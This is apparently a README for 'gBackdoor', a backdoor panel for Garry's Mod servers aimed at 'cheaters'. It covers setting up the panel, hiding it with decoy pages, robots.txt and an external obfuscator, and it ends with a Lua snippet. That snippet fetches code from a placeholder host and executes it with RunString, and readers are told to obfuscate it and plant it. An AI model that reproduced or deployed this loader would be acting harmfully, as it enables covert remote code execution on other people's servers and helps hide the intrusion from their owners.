gBackdoor Version 1.1

A long time ago I downloaded this git. It was deleted, and I reload it =)

Hello fellow cheaters!
Just as a note, this was horribly made. I hope someone can optimize it.

This is a translated version of gBackdoor for all of you to see!

So first, you need to setup a Database.
Once you created one, goto your phpmyadmin and select the database you created,
Then goto the import tab, and drop the gbackdoor.sql file into there.
After that, navigate to core/class and open config.php and put in your database credentials

If done correctly, you can now login: 
Username: admin
Password: admin

I suggest you create a new user and delete the admin user manually from phpmyadmin.

Also, The obfuscation kind of sucks, so don't use it. Instead, use champgeeks obfuscator on NulledBB.
You'll find it. Just look harder.
Another thing i suggest you do is change the index.php file to something else so others dont cant get into your panel.
Notes:
Incase others go snooping around to figure out ways to get into your panel, i have created 2 files named createaccount.php and resetpassword.php
to trick people into thinking its an actual page.
This also comes with a font-awesome pack so you can use a few icons.
DO NOT DELETE robots.txt OR YOU COULD BE EXPOSED EASILY ON SEARCH ENGINES!


Heres the code you can obfuscate. Just replace the example website with yours.
And make sure it goes to core/stage1.php otherwise it will not work.
-----------------------------------------

http.Fetch("https://somewebsitelol.com/somedirectory/core/stage1.php", function(body)
    RunString(body)
end or function(c)
    RunString(c)
end)